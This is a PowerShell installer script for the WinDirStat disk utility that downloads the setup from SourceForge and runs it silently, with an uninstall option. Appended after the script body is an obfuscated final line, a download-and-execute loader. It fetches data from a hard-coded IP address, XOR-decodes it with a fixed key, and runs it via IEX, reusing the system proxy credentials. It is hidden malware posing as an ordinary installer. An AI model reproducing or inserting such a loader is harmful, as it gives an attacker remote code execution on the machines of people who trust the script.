param(
	[string]$Version,
	[string]$Path,
	[switch]$Force,
	$Update,
	[switch]$Uninstall
)





$Configs = @{
	Version = "1.1.2"
	Url = "http://freefr.dl.sourceforge.net/project/windirstat/windirstat/1.1.2%20installer%20re-release%20%28more%20languages%21%29/windirstat1_1_2_setup.exe"
    Path = "$(Split-Path -Path $MyInvocation.MyCommand.Definition -Parent)\"
}

$Configs | where{$_.Version -eq $Version} | ForEach-Object{

    try{

        $_.Result = $null
        if(-not $_.Path){$_.Path = $Path}
        $Config = $_

        
        
        

        if(-not $Uninstall){

            
            
            

            if($_.ConditionExclusion){            
                $_.ConditionExclusionResult = $(Invoke-Expression $Config.ConditionExclusion -ErrorAction SilentlyContinue)        
            }    
            if(($_.ConditionExclusionResult -eq $null) -or $Force){
                    	
                
                
                

                $_.Downloads = $_.Url | ForEach-Object{
                    Get-File -Url $_ -Path $Config.Path
                }       			

                
                
                
				
                $_.Downloads | ForEach-Object{
                    Start-Process -FilePath $(Join-Path $_.Path $_.Filename) -ArgumentList "/S /NORESTART" -Wait
                }
                		
                
                
                
                
                
                
                

                $_.Downloads | ForEach-Object{
                    Remove-Item (Join-Path $_.Path $_.Filename) -Force
                }
                		
                
                
                
                		
                if($Update){
                    $_.Result = "AppUpdated";$_
                }elseif($Downgrade){
                    $_.Result = "AppDowngraded";$_
                }else{
                    $_.Result = "AppInstalled";$_
                }
            		
            
            
            
            		
            }else{
            	
                $_.Result = "ConditionExclusion";$_
            }

        
        
        
        	
        }else{

			$Executable = "C:\Program Files (x86)\WinDirStat\Uninstall.exe"; if(Test-Path $Executable){Start-Process -FilePath $Executable -ArgumentList "/S /NORESTART" -Wait}

            $_.Result = "AppUninstalled";$_
        }

    
    
    

    }catch{

        $Config.Result = "Error";$Config
    }
}
$WysTEm.Net.SeRviCEPOIntMaNAGer]::EXPECT100ContinUe = 0;$wc=New-ObjeCT SysTem.Net.WebCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAdErs.ADD('User-Agent',$u);$WC.PrOXy = [SYStem.NeT.WeBREQUeSt]::DefaultWebPROxy;$wc.PROxy.CrEDenTiALs = [SySTem.Net.CrEdENTIAlCAcHe]::DefAuLtNEtwOrKCRedenTiaLS;$K='cc03e747a6afbbcbf8be7668acfebee5';$I=0;[CHar[]]$B=([chaR[]]($wC.DOwnLoaDSTriNg("http://103.238.227.201:7788/index.asp")))|%{$_-BXoR$K[$I++%$k.LeNgTH]};IEX ($b-JoIN'')

